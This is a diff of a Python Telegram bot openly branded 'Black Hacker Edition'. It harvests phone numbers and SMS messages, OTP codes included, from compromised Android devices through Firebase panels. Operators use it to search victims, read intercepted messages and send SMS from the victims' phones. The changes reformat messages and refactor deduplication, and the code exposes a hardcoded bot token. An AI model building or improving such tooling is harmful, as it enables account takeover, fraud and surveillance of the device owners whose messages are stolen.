@@ -2,8 +2,8 @@
 """
 ══════════════════════════════════════════════════════
   ☠️ OTP PANEL BOT — BLACK HACKER EDITION ☠️
-  Out-of-Memory (OOM) Fixed | Low RAM Optimized (Railway)
-  Instant Button Response | Elite Vault | Ghost Workers
+  Live Incremental Counter | UI Bug Fixed (HTML)
+  Memory Optimized | Ghost Workers Alive
 ══════════════════════════════════════════════════════
 """
 
@@ -48,9 +48,8 @@ PAGE_SIZE       = 20
 TOKEN           = os.getenv("BOT_TOKEN", "8751858624:AAHAA2jMVScmhYECFtLVQ-q89ImsXh6mct8")
 BOT_USERNAME    = "fjjhfbot"
 
-# 🔥 MEMORY OPTIMIZATION FOR RAILWAY (Prevents "Out of memory" Crash)
-CHUNK_SIZE      = 20    # Safe limit for 500MB RAM
-HTTP_CONCURRENCY= 50    # Prevents network flooding
+CHUNK_SIZE      = 25    
+HTTP_CONCURRENCY= 50    
 
 ADMIN_IDS: set[int] = {
     6860106371,   
@@ -94,7 +93,7 @@ WORKER_SEMAPHORE = asyncio.Semaphore(HTTP_CONCURRENCY)
 PREFETCH_POOL: dict[str, list] = {}
 PREFETCH_TASKS: dict[str, asyncio.Task] = {}
 
-HEAVY_TASK_LIMITER = asyncio.Semaphore(5) # Limits heavy manual scans to prevent CPU overload
+HEAVY_TASK_LIMITER = asyncio.Semaphore(5) 
 
 scan_progress = {
     "scanned": 0,
@@ -228,9 +227,9 @@ async def auto_save_loop():
             await asyncio.to_thread(save_settings)
             for uid in list(all_users.keys()):
                 await asyncio.to_thread(save_user, uid)
-            if len(seen_ids) > 50000:  # Prevent memory leak from seen_ids
+            if len(seen_ids) > 50000:
                 seen_ids.clear()
-            gc.collect() # 🔥 Aggressive Garbage Collection to prevent OOM
+            gc.collect() 
         except: await asyncio.sleep(5)
 
 async def hourly_admin_backup(app: Application):
@@ -243,17 +242,17 @@ async def hourly_admin_backup(app: Application):
             total_custom_panels = sum(len(u.get("custom_dbs", [])) for u in all_users.values())
 
             report = (
-                "📊 **HOURLY ADMIN REPORT**\n\n"
-                f"👤 **Total Users:** {total_users}\n"
-                f"👑 **VIP/Admin Users:** {vip_users}\n"
-                f"🆓 **Free Users:** {free_users}\n"
-                f"🔗 **Total Custom Panels Added:** {total_custom_panels}\n\n"
+                "<b>📊 HOURLY ADMIN REPORT</b>\n\n"
+                f"👤 <b>Total Users:</b> {total_users}\n"
+                f"👑 <b>VIP/Admin Users:</b> {vip_users}\n"
+                f"🆓 <b>Free Users:</b> {free_users}\n"
+                f"🔗 <b>Total Custom Panels Added:</b> {total_custom_panels}\n\n"
             )
             file_path = os.path.join(SYS_DIR, f"Backup_{int(time.time())}.json")
             with open(file_path, "w", encoding="utf-8") as f:
                 json.dump(all_users, f, indent=4)
             for adm in ADMIN_IDS:
-                try: await app.bot.send_document(adm, document=open(file_path, "rb"), caption=report, parse_mode="Markdown")
+                try: await app.bot.send_document(adm, document=open(file_path, "rb"), caption=report, parse_mode="HTML")
                 except: pass
             try: os.remove(file_path)
             except: pass
@@ -296,7 +295,7 @@ async def global_error_handler(update: object, context: ContextTypes.DEFAULT_TYP
 async def get_http_session() -> aiohttp.ClientSession:
     global _http_session
     if _http_session is None or _http_session.closed:
-        connector = aiohttp.TCPConnector(limit=HTTP_CONCURRENCY, keepalive_timeout=20, enable_cleanup_closed=True)
+        connector = aiohttp.TCPConnector(limit=300, keepalive_timeout=20, enable_cleanup_closed=True)
         _http_session = aiohttp.ClientSession(connector=connector)
     return _http_session
 
@@ -388,7 +387,7 @@ async def verify_recent_sms(device, max_age_sec=1800) -> tuple[bool, float]:
     return False, 0.0
 
 # ═══════════════════════════════════════════════════════
-#  UTILITY FORMATTERS & MENUS (COMPACT UI)
+#  UTILITY FORMATTERS & MENUS (HTML SECURE)
 # ═══════════════════════════════════════════════════════
 
 def get_checker_menu(prefix="chk_srv:"):
@@ -419,6 +418,7 @@ def device_label(d: Device) -> str:
     if d.numbers: return " & ".join(d.numbers)
     return f"{d.name} ({d.id[:8]})"
 
+# 🔥 FIXED: Using <b> instead of ** for zero UI bugs!
 def device_list_header(devices: list[Device], page: int = 0) -> str:
     online  = sum(1 for d in devices if d.status == "online")
     offline = len(devices) - online
@@ -430,15 +430,15 @@ def device_list_header(devices: list[Device], page: int = 0) -> str:
         scanned = scan_progress.get("scanned", 0)
         tot = scan_progress.get("total", 1)
         pct = int((scanned / max(tot, 1)) * 100)
-        scan_text = f"⏳ **Live Exploit:** {scanned}/{tot} Servers ({pct}%)\n"
+        scan_text = f"⏳ <b>Live Exploit:</b> {scanned}/{tot} Servers ({pct}%)\n"
 
     return (
-        f"☠️ **DARK WEB TERMINAL** ☠️\n━━━━━━━━━━━━━━━━━━\n"
+        f"☠️ <b>DARK WEB TERMINAL</b> ☠️\n━━━━━━━━━━━━━━━━━━\n"
         f"{scan_text}"
         f"🟢 Active Nodes: {online}\n"
         f"🔴 Dead Nodes: {offline}\n"
         f"📱 Total Devices: {len(devices)}\n"
-        f"🔢 **Total Stolen Numbers: {total_nums}**\n"
+        f"🔢 <b>Total Stolen Numbers: {total_nums}</b>\n"
         f"━━━━━━━━━━━━━━━━━━\n"
         f"Page {page + 1} of {total_pages}\nSelect a target below:"
     )
@@ -558,8 +558,8 @@ def format_sms_block_markdown(sms: dict) -> tuple[str, Optional[str]]:
     date   = sms_date(sms)
     sender = sms.get("sender") or "Unknown"
     
-    if otp: block = f"🔹 **From:** `{sender}`\n📅 **Date:** {date}\n🔑 **OTP:** `{otp}`\n✉️ **Msg:** {body}"
-    else: block = f"🔹 **From:** `{sender}`\n📅 **Date:** {date}\n✉️ **Msg:** {body}"
+    if otp: block = f"🔹 <b>From:</b> <code>{sender}</code>\n📅 <b>Date:</b> {date}\n🔑 <b>OTP:</b> <code>{otp}</code>\n✉️ <b>Msg:</b> {body}"
+    else: block = f"🔹 <b>From:</b> <code>{sender}</code>\n📅 <b>Date:</b> {date}\n✉️ <b>Msg:</b> {body}"
     return block, otp
 
 def auto_forward_msg(sms: dict, num_label: str) -> str:
@@ -584,7 +584,7 @@ def admin_panel_text(bot_token: str) -> str:
     users_db = all_users
     total    = len(users_db)
     total_otps = sum(u.get("otp_count", 0) for u in users_db.values())
-    return f"☠️ SUPER ADMIN PANEL ☠️\n━━━━━━━━━━━━━━━━━━\nTotal Hackers : {total}\nTotal Exploit Views: {total_otps}\n━━━━━━━━━━━━━━━━━━\nUpdated: {datetime.now().strftime('%d %b %Y %I:%M %p')}"
+    return f"☠️ <b>SUPER ADMIN PANEL</b> ☠️\n━━━━━━━━━━━━━━━━━━\nTotal Hackers : {total}\nTotal Exploit Views: {total_otps}\n━━━━━━━━━━━━━━━━━━\nUpdated: {datetime.now().strftime('%d %b %Y %I:%M %p')}"
 
 def admin_keyboard(bot_token: str) -> InlineKeyboardMarkup:
     keys = [
@@ -614,7 +614,7 @@ def format_checker_result(service: str, number: str, is_reg: bool, ms: int, is_e
     return f"<b>{'☠️ TARGET VULNERABLE (UNREGISTERED)' if not is_reg else '✅ TARGET SECURE (REGISTERED)'}</b>\n\n{emoji} <b>{srv_name}</b>\n📱 {display_num}\n⚡ Ping: {ms} ms"
 
 # ═══════════════════════════════════════════════════════
-#  FIREBASE DATA FETCHERS (MEMORY OPTIMIZED)
+#  FIREBASE DATA FETCHERS 
 # ═══════════════════════════════════════════════════════
 
 async def fetch_db_data_task(tag: str, url: str, results_list: list):
@@ -632,7 +632,7 @@ async def fetch_db_data_task(tag: str, url: str, results_list: list):
                 if dev_id in added_set: continue
                 info = info_all.get(dev_id) or {}
                 nums = extract_all_nums(sim, info)
-                if not nums: continue # 🟢 Saves RAM by ignoring dead/empty devices
+                if not nums: continue 
                 added_set.add(dev_id)
                 model = info.get("DeviceModel") or info.get("Brand") or f"Device-{dev_id[:6]}"
                 devices_list.append(Device(id=dev_id, name=model, status=parse_status_str(info.get("Status")), battery=parse_battery(info.get("Battery")), timestamp=int(info.get("currentTimeMillis") or sim.get("timestamp") or 0), numbers=nums, device_info=f"Model: {model}\nBrand: {info.get('Brand','')}\nAndroid: {info.get('AndroidVersion','')}\nDevice ID: {dev_id}", sms_path=f"All_Users/sms/{dev_id}", base_url=url, db_tag=tag, last_sms_ts=0.0))
@@ -642,7 +642,7 @@ async def fetch_db_data_task(tag: str, url: str, results_list: list):
                 if dev_id in added_set: continue
                 if not isinstance(data, dict): continue
                 nums = extract_all_nums(data)
-                if not nums: continue # 🟢 Saves RAM
+                if not nums: continue 
                 added_set.add(dev_id)
                 devices_list.append(Device(id=dev_id, name=data.get("d_name") or f"Device-{dev_id[:6]}", status=parse_status_str(data.get("status")), battery=parse_battery(data.get("battery")), timestamp=int(data.get("timestamp") or 0), numbers=nums, device_info=data.get("Device_info") or f"Device ID: {dev_id}", sms_path=f"user_sms/{dev_id}", base_url=url, db_tag=tag, last_sms_ts=0.0))
         
@@ -665,6 +665,22 @@ async def fetch_db_data_task(tag: str, url: str, results_list: list):
     finally:
         scan_progress["scanned"] += 1
 
+def process_devices_list(raw_list):
+    unique_devices = []
+    seen_ids_cache = set()
+    seen_numbers = set()
+    for d in raw_list:
+        if d.id in seen_ids_cache: continue
+        seen_ids_cache.add(d.id)
+        if d.numbers:
+            new_nums = [num for num in d.numbers if num not in seen_numbers]
+            if not new_nums: continue 
+            d.numbers = new_nums
+            seen_numbers.update(new_nums)
+        unique_devices.append(d)
+    unique_devices.sort(key=lambda d: (0 if d.status == "online" else 1, 0 if len(d.numbers) > 0 else 1, -d.timestamp))
+    return unique_devices
+
 async def _update_global_cache():
     global scan_progress
     dbs_to_poll = dict(DATABASES)
@@ -684,29 +700,20 @@ async def _update_global_cache():
     scan_progress["scanned"] = 0
     scan_progress["is_scanning"] = True
     
+    # 🔥 LIVE INCREMENTAL SYNC FOR THE FIRST BOOT! No more 0 dropping.
+    is_first_run = len(GLOBAL_DEVICE_CACHE.get("ALL", [])) == 0
+
     for i in range(0, len(items), CHUNK_SIZE):
         chunk = items[i:i + CHUNK_SIZE]
         tasks = [fetch_device_data_task(tag, url, all_devices_gathered) for tag, url in chunk]
         await asyncio.gather(*tasks, return_exceptions=True)
-        await asyncio.sleep(0.5) # Prevents CPU spike
         
-    # 🔥 STABLE UPDATE: Cache updates ONLY when fully complete. Count will never drop!
-    unique_devices = []
-    seen_ids_cache = set()
-    seen_numbers = set()
-
-    for d in all_devices_gathered:
-        if d.id in seen_ids_cache: continue
-        seen_ids_cache.add(d.id)
-        if d.numbers:
-            new_nums = [num for num in d.numbers if num not in seen_numbers]
-            if not new_nums: continue 
-            d.numbers = new_nums
-            seen_numbers.update(new_nums)
-        unique_devices.append(d)
-
-    unique_devices.sort(key=lambda d: (0 if d.status == "online" else 1, 0 if len(d.numbers) > 0 else 1, -d.timestamp))
-    GLOBAL_DEVICE_CACHE["ALL"] = unique_devices
+        if is_first_run:
+            GLOBAL_DEVICE_CACHE["ALL"] = process_devices_list(all_devices_gathered)
+            
+        await asyncio.sleep(0.5) 
+        
+    GLOBAL_DEVICE_CACHE["ALL"] = process_devices_list(all_devices_gathered)
     scan_progress["is_scanning"] = False
 
 async def get_all_devices(bot_token: str, chat_id: int = 0, users_db: dict = None) -> list[Device]:
@@ -732,22 +739,7 @@ async def get_all_devices(bot_token: str, chat_id: int = 0, users_db: dict = Non
     for tag in dbs_to_check:
         devices.extend(GLOBAL_DEVICE_CACHE.get(tag, []))
 
-    unique_devices = []
-    seen_ids_set = set()
-    seen_numbers = set()
-
-    for d in devices:
-        if d.id in seen_ids_set: continue
-        seen_ids_set.add(d.id)
-        if d.numbers:
-            new_nums = [num for num in d.numbers if num not in seen_numbers]
-            if not new_nums: continue 
-            d.numbers = new_nums
-            seen_numbers.update(new_nums)
-        unique_devices.append(d)
-
-    unique_devices.sort(key=lambda d: (0 if d.status == "online" else 1, 0 if len(d.numbers) > 0 else 1, -d.timestamp))
-    return unique_devices
+    return process_devices_list(devices)
 
 async def get_device_sms(device: Device, limit: int = 10, max_age_sec: int = 3600) -> list[dict]:
     try:
@@ -801,7 +793,7 @@ async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
             [InlineKeyboardButton("Join Group", url="https://t.me/rosekhudkabanaya")],
             [InlineKeyboardButton("✅ I have joined", callback_data="check_join")]
         ])
-        await update.message.reply_text("⚠️ **UNAUTHORIZED ACCESS**\n\nTerminal locked. Join all syndicate channels to authenticate.", reply_markup=join_kb, parse_mode="Markdown")
+        await update.message.reply_text("⚠️ <b>UNAUTHORIZED ACCESS</b>\n\nTerminal locked. Join all syndicate channels to authenticate.", reply_markup=join_kb, parse_mode="HTML")
         return
 
     args = ctx.args
@@ -827,7 +819,7 @@ async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
                     all_users[referrer_id]["referrals"] += 1
                     if all_users[referrer_id]["referrals"] % 20 == 0:
                         all_users[referrer_id]["vip_until"] = time.time() + (24 * 3600)
-                        try: await ctx.bot.send_message(referrer_id, "🎉 **SYNDICATE LEVEL UP!**\nTarget achieved (20 refers). You have been granted **24 Hours Elite VIP Access** to the Global Network!", parse_mode="Markdown")
+                        try: await ctx.bot.send_message(referrer_id, "🎉 <b>SYNDICATE LEVEL UP!</b>\nTarget achieved (20 refers). You have been granted <b>24 Hours Elite VIP Access</b> to the Global Network!", parse_mode="HTML")
                         except: pass
             except: pass
         save_user(chat_id)
@@ -836,13 +828,13 @@ async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
     chats_registry.setdefault(bot_token, set()).add(chat_id)
     
     welcome_text = (
-        f"☠️ **OTP TERMINAL - BLACK HACKER EDITION** ☠️\n━━━━━━━━━━━━━━━━━━\n"
+        f"☠️ <b>OTP TERMINAL - BLACK HACKER EDITION</b> ☠️\n━━━━━━━━━━━━━━━━━━\n"
         f"Access Granted, Operator {user.first_name}.\n\n"
         "Secure connection established. Awaiting target parameters.\n\n"
-        "💻 **Script Kiddies (Free):** Inject your own Private Panels.\n"
-        "👑 **Elite Syndicate (VIP):** 20 refers = Unlimited access to Global Payload Network."
+        "💻 <b>Script Kiddies (Free):</b> Inject your own Private Panels.\n"
+        "👑 <b>Elite Syndicate (VIP):</b> 20 refers = Unlimited access to Global Payload Network."
     )
-    await update.message.reply_text(welcome_text, reply_markup=get_reply_menu(chat_id), parse_mode="Markdown")
+    await update.message.reply_text(welcome_text, reply_markup=get_reply_menu(chat_id), parse_mode="HTML")
 
 # ═══════════════════════════════════════════════════════
 #  CALLBACK QUERY HANDLER
@@ -860,7 +852,7 @@ async def on_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
             pending_action.pop(chat_id, None)
             try: await query.message.delete()
             except: pass
-            await ctx.bot.send_message(chat_id, "❌ **MISSION ABORTED.** Background process killed.", parse_mode="Markdown")
+            await ctx.bot.send_message(chat_id, "❌ <b>MISSION ABORTED.</b> Background process killed.", parse_mode="HTML")
             return
 
         if data.startswith("wish:"):
@@ -914,7 +906,7 @@ async def on_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
         if data.startswith("chk_srv:"):
             service = data.split(":")[1]
             pending_action[chat_id] = {"action": "check_number_input", "service": service}
-            await safe_edit(query, f"Deploying to {service.capitalize()}...\n\nEnter 10-digit target number (or multiple with spaces):\n\n_Press Cancel to abort mission_", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Abort Mission", callback_data="cancel_action")]]), parse_mode="Markdown")
+            await safe_edit(query, f"Deploying to {service.capitalize()}...\n\nEnter 10-digit target number (or multiple with spaces):\n\n<i>Press Cancel to abort mission</i>", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Abort Mission", callback_data="cancel_action")]]), parse_mode="HTML")
             return
 
         if data.startswith("auto_fb:"):
@@ -937,7 +929,7 @@ async def on_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
                 final_num = valid_item["num"]
                 
                 seen_set.add(final_num)
-                await safe_edit(query, f"⚡ <b>GHOST CACHE HIT</b>\n━━━━━━━━━━━━━━━━━━\n📡 *Injecting payload directly...*", parse_mode="HTML")
+                await safe_edit(query, f"⚡ <b>GHOST CACHE HIT</b>\n━━━━━━━━━━━━━━━━━━\n📡 <i>Injecting payload directly...</i>", parse_mode="HTML")
                 await asyncio.sleep(0.3)
                 await fb_send_sms(final_dev, final_num, f"Ready for {service.upper()} OTP. Keep phone active.")
                 
@@ -1003,7 +995,7 @@ async def on_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
                         
             if found_unreg:
                 seen_set.add(final_num)
-                await safe_edit(query, f"☠️ **ZERO-DAY VULNERABILITY FOUND**\n━━━━━━━━━━━━━━━━━━\n🎯 **Target Unregistered:** `+{final_num[-10:]}`\n\n💉 *Injecting Payload SMS...*", parse_mode="Markdown")
+                await safe_edit(query, f"☠️ <b>ZERO-DAY VULNERABILITY FOUND</b>\n━━━━━━━━━━━━━━━━━━\n🎯 <b>Target Unregistered:</b> <code>+{final_num[-10:]}</code>\n\n💉 <i>Injecting Payload SMS...</i>", parse_mode="HTML")
                 await fb_send_sms(final_dev, final_num, f"Ready for {service.upper()} OTP. Keep phone active.")
                 
                 time_diff = int(time.time() - final_dev.last_sms_ts)
@@ -1027,13 +1019,13 @@ async def on_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
 
         if data.startswith("search_num:"):
             search_term = data.split(":")[1]
-            await safe_edit(query, f"⏳ Bypassing firewalls to find target `{search_term}`...", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Abort Mission", callback_data="cancel_action")]]), parse_mode="Markdown")
+            await safe_edit(query, f"⏳ Bypassing firewalls to find target <code>{search_term}</code>...", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Abort Mission", callback_data="cancel_action")]]), parse_mode="HTML")
             all_devices = await get_all_devices(bot_token, chat_id, users_db)
             found_devs = [d for d in all_devices if any(search_term in num for num in d.numbers) and d.status == "online"]
-            if not found_devs: return await safe_edit(query, f"📭 Target `+{search_term}` not found on active network.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Close", callback_data="close_msg")]]))
+            if not found_devs: return await safe_edit(query, f"📭 Target <code>+{search_term}</code> not found on active network.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Close", callback_data="close_msg")]]), parse_mode="HTML")
             rows = [[InlineKeyboardButton(f"🟢 📱 [{d.db_tag}] {' & '.join(d.numbers)}", callback_data=f"sel:{d.id}")] for d in found_devs[:10]]
             rows.append([InlineKeyboardButton("❌ Close", callback_data="close_msg")])
-            return await safe_edit(query, f"🔍 **Target Traced:** `{search_term}`\nSelect node to intercept data:", reply_markup=InlineKeyboardMarkup(rows))
+            return await safe_edit(query, f"🔍 <b>Target Traced:</b> <code>{search_term}</code>\nSelect node to intercept data:", reply_markup=InlineKeyboardMarkup(rows), parse_mode="HTML")
 
         if data.startswith("del_panel:"):
             idx_to_del = int(data.split(":")[1])
@@ -1052,7 +1044,7 @@ async def on_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
                 url_str = db if isinstance(db, str) else db.get("url", "")
                 kb.append([InlineKeyboardButton(f"❌ Drop: {url_str[:25]}...", callback_data=f"del_panel:{i}")])
             kb.append([InlineKeyboardButton("Close", callback_data="close_msg")])
-            await safe_edit(query, "🗑 **Drop Private Panels**\nSelect a node to disconnect from your network:", reply_markup=InlineKeyboardMarkup(kb), parse_mode="Markdown")
+            await safe_edit(query, "🗑 <b>Drop Private Panels</b>\nSelect a node to disconnect from your network:", reply_markup=InlineKeyboardMarkup(kb), parse_mode="HTML")
             return
 
         if data == "sa_add_global_panel":
@@ -1102,27 +1094,27 @@ async def on_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
 
         if data == "admin_refresh":
             user_focus.setdefault(bot_token, {}).pop(chat_id, None)
-            await safe_edit(query, admin_panel_text(bot_token), reply_markup=admin_keyboard(bot_token))
+            await safe_edit(query, admin_panel_text(bot_token), reply_markup=admin_keyboard(bot_token), parse_mode="HTML")
             return
 
         if data == "home":
             user_focus.setdefault(bot_token, {}).pop(chat_id, None)
             pending_action.pop(chat_id, None)
             devices = await get_all_devices(bot_token, chat_id, users_db)
-            await safe_edit(query, device_list_header(devices, 0), reply_markup=device_list_keyboard(devices, 0))
+            await safe_edit(query, device_list_header(devices, 0), reply_markup=device_list_keyboard(devices, 0), parse_mode="HTML")
             return
 
         if data.startswith("pg:"):
             user_focus.setdefault(bot_token, {}).pop(chat_id, None)
             page = int(data[3:])
             devices = await get_all_devices(bot_token, chat_id, users_db)
-            await safe_edit(query, device_list_header(devices, page), reply_markup=device_list_keyboard(devices, page))
+            await safe_edit(query, device_list_header(devices, page), reply_markup=device_list_keyboard(devices, page), parse_mode="HTML")
             return
 
         if data == "online":
             user_focus.setdefault(bot_token, {}).pop(chat_id, None)
             devices = await get_all_devices(bot_token, chat_id, users_db)
-            await safe_edit(query, f"🟢 **ONLINE TARGETS**\n━━━━━━━━━━━━━━━━━━\nLock onto a target:", reply_markup=online_only_keyboard(devices))
+            await safe_edit(query, f"🟢 <b>ONLINE TARGETS</b>\n━━━━━━━━━━━━━━━━━━\nLock onto a target:", reply_markup=online_only_keyboard(devices), parse_mode="HTML")
             return
 
         if data.startswith("cp:"):
@@ -1141,8 +1133,8 @@ async def on_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
             label = device_label(device)
             status = "Online" if device.status == "online" else "Offline"
             bat = f"{bat_emoji(device.battery)} {device.battery}%"
-            text = f"💻 **SECURE CONNECTION ESTABLISHED**\n━━━━━━━━━━━━━━━━━━\nTarget  : {label}\nStatus  : {status}\nBattery : {bat}\nNode IP  : {device.db_tag}\n━━━━━━━━━━━━━━━━━━\nIntercepting LIVE packets... Press Disconnect to terminate."
-            await safe_edit(query, text, reply_markup=device_action_keyboard(dev_id))
+            text = f"💻 <b>SECURE CONNECTION ESTABLISHED</b>\n━━━━━━━━━━━━━━━━━━\nTarget  : {label}\nStatus  : {status}\nBattery : {bat}\nNode IP  : {device.db_tag}\n━━━━━━━━━━━━━━━━━━\nIntercepting LIVE packets... Press Disconnect to terminate."
+            await safe_edit(query, text, reply_markup=device_action_keyboard(dev_id), parse_mode="HTML")
             return
 
         if data.startswith("msgs:"):
@@ -1170,10 +1162,10 @@ async def on_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
             refresh_btn = InlineKeyboardButton("🔄 Intercept Again", callback_data=data)
             
             if not smss:
-                await safe_edit(query, f"📭 **Data Stream Empty (1H)**\n📱 Target: `{label}`\n\nNo packets intercepted in last 60 minutes. Keep pinging via **Intercept Again**.", reply_markup=InlineKeyboardMarkup([[refresh_btn, back_btn]]), parse_mode="Markdown")
+                await safe_edit(query, f"📭 <b>Data Stream Empty (1H)</b>\n📱 Target: <code>{label}</code>\n\nNo packets intercepted in last 60 minutes. Keep pinging via <b>Intercept Again</b>.", reply_markup=InlineKeyboardMarkup([[refresh_btn, back_btn]]), parse_mode="HTML")
                 return
                 
-            header = f"📩 **INTERCEPTED PACKETS (1H)**\n━━━━━━━━━━━━━━━━━━\n📱 **Target:** `{label}`\n━━━━━━━━━━━━━━━━━━\n\n"
+            header = f"📩 <b>INTERCEPTED PACKETS (1H)</b>\n━━━━━━━━━━━━━━━━━━\n📱 <b>Target:</b> <code>{label}</code>\n━━━━━━━━━━━━━━━━━━\n\n"
             body_parts, otp_buttons, has_otp = [], [], False
             
             for sms in smss:
@@ -1191,7 +1183,7 @@ async def on_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
             if len(full_text) > 4000: full_text = full_text[:4000] + "\n\n...[Data Truncated]"
             
             otp_buttons.append([refresh_btn, back_btn])
-            await safe_edit(query, full_text, reply_markup=InlineKeyboardMarkup(otp_buttons), parse_mode="Markdown")
+            await safe_edit(query, full_text, reply_markup=InlineKeyboardMarkup(otp_buttons), parse_mode="HTML")
             return
 
         if data.startswith("info:"):
@@ -1206,7 +1198,7 @@ async def on_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
             label = device_label(device)
             status = "Online" if device.status == "online" else "Offline"
             bat = f"{bat_emoji(device.battery)} {device.battery}%"
-            text = f"💻 **NODE DIAGNOSTICS**\n━━━━━━━━━━━━━━━━━━\nTarget  : {label}\nStatus  : {status}\nBattery : {bat}\nNode IP  : {device.db_tag}\n"
+            text = f"💻 <b>NODE DIAGNOSTICS</b>\n━━━━━━━━━━━━━━━━━━\nTarget  : {label}\nStatus  : {status}\nBattery : {bat}\nNode IP  : {device.db_tag}\n"
             for i, num in enumerate(device.numbers, 1): text += f"SIM {i}   : {num}\n"
             if device.device_info: text += f"\n{device.device_info}\n"
             
@@ -1215,7 +1207,7 @@ async def on_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
                 [InlineKeyboardButton("View Fast Inbox", callback_data=f"msgs:{dev_id}"), InlineKeyboardButton("Back", callback_data=f"sel:{dev_id}")],
                 [InlineKeyboardButton("Disconnect & Back",  callback_data="home")],
             ])
-            await safe_edit(query, text, reply_markup=kb)
+            await safe_edit(query, text, reply_markup=kb, parse_mode="HTML")
             return
 
     except: pass
@@ -1238,12 +1230,11 @@ async def on_text(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
                 [InlineKeyboardButton("Join Group", url="https://t.me/rosekhudkabanaya")],
                 [InlineKeyboardButton("✅ I have joined", callback_data="check_join")]
             ])
-            await update.message.reply_text("⚠️ **UNAUTHORIZED ACCESS**\n\nTerminal locked. Join all syndicate channels to authenticate.", reply_markup=join_kb, parse_mode="Markdown")
+            await update.message.reply_text("⚠️ <b>UNAUTHORIZED ACCESS</b>\n\nTerminal locked. Join all syndicate channels to authenticate.", reply_markup=join_kb, parse_mode="HTML")
             return
 
         if is_spamming(chat_id): return
 
-        # 🔥 REMOVED THE LOCK FROM DEVICES LIST SO IT'S INSTANT 🔥
         if text == "📱 Devices List":
             user_focus.setdefault(bot_token, {}).pop(chat_id, None)
             pending_action.pop(chat_id, None)
@@ -1257,17 +1248,17 @@ async def on_text(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
                     pct = int((scanned / max(total, 1)) * 100)
                     
                     msg = (
-                        f"⏳ **Bypassing Firewalls (Live Scan)**\n\n"
+                        f"⏳ <b>Bypassing Firewalls (Live Scan)</b>\n\n"
                         f"Establishing connections with Global Network...\n"
-                        f"📊 **Penetration:** {scanned} / {total} Servers ({pct}%)\n\n"
+                        f"📊 <b>Penetration:</b> {scanned} / {total} Servers ({pct}%)\n\n"
                         f"Press below to refresh."
                     )
-                    await update.message.reply_text(msg, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔄 Refresh", callback_data="home")]]), parse_mode="Markdown")
+                    await update.message.reply_text(msg, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔄 Refresh", callback_data="home")]]), parse_mode="HTML")
                 else:
                     await update.message.reply_text("❌ Zero active nodes detected. Inject Custom Panels or upgrade to VIP.")
                 return
                 
-            await update.message.reply_text(device_list_header(devices, 0), reply_markup=device_list_keyboard(devices, 0))
+            await update.message.reply_text(device_list_header(devices, 0), reply_markup=device_list_keyboard(devices, 0), parse_mode="HTML")
             return
 
         if text == "🕸️ Elite Vault":
@@ -1277,7 +1268,7 @@ async def on_text(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
             is_admin = chat_id in ADMIN_IDS
             
             if not (is_vip or is_admin):
-                await update.message.reply_text("⛔ **ACCESS DENIED: INSUFFICIENT REP**\n\nElite Vault is restricted to Syndicate VIPs. Get 20 Referrals to unlock.", parse_mode="Markdown")
+                await update.message.reply_text("⛔ <b>ACCESS DENIED: INSUFFICIENT REP</b>\n\nElite Vault is restricted to Syndicate VIPs. Get 20 Referrals to unlock.", parse_mode="HTML")
                 return
                 
             wishlist = uinfo.get("wishlist", [])
@@ -1296,13 +1287,13 @@ async def on_text(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
                 await update.message.reply_text("❌ All panels in your Vault are currently DEAD/Offline.")
                 return
                 
-            await update.message.reply_text(device_list_header(vault_devices, 0), reply_markup=device_list_keyboard(vault_devices, 0))
+            await update.message.reply_text(device_list_header(vault_devices, 0), reply_markup=device_list_keyboard(vault_devices, 0), parse_mode="HTML")
             return
 
         if text == "🔍 Search Target":
             user_focus.setdefault(bot_token, {}).pop(chat_id, None)
             pending_action[chat_id] = {"action": "search_live_number"}
-            await update.message.reply_text("🔍 **TARGET SEARCH INITIATED**\n\nEnter target MSISDN (e.g., 911234567890):\n\n_Press Cancel to abort_", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Abort Mission", callback_data="cancel_action")]]), parse_mode="Markdown")
+            await update.message.reply_text("🔍 <b>TARGET SEARCH INITIATED</b>\n\nEnter target MSISDN (e.g., 911234567890):\n\n<i>Press Cancel to abort</i>", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Abort Mission", callback_data="cancel_action")]]), parse_mode="HTML")
             return
 
         if text == "☠️ Payload Injector":
@@ -1323,26 +1314,26 @@ async def on_text(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
             ref_link = f"https://t.me/{bot_user.username}?start=ref_{chat_id}"
             
             msg = (
-                "🎁 **SYNDICATE REP SYSTEM**\n━━━━━━━━━━━━━━━━━━\n"
-                f"👤 **Your Rep:** {ref_count} / 20 Targets\n\n"
-                "Invite 20 operators to unlock **Elite VIP Status** (Unlimited Global Access & Elite Vault) for 24 Hours!\n\n"
-                f"🔗 **Your Exploit Link:**\n`{ref_link}`"
